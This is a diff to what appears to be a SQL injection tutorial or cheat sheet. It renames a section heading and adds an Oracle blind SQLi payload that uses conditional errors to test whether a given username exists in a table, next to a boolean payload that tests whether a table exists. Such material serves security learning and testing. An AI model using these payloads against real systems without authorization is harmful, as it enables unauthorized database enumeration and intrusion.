@@ -161,7 +161,7 @@ like check each one and if responses differ you got a SQLi vulnerability
 ' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'--
 ```
 
-### 3. Checking User Presence
+### 3. Checking User Entry
 
 - For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
 - Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.
@@ -228,6 +228,15 @@ NOTE: this is for oracle databases so check the Cheatsheet of SQli to give datab
 */
 ```
 
+### 3. Checking User Entry
+
+```sql
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table_name> WHERE <username_column>='<username>')='a'--
+
+/*
+NOTE: For database specific string concatenation and syntaxes checkout the Cheatsheet of the SQli.
+*/
+```
 
 ---
 ## Examining the Database
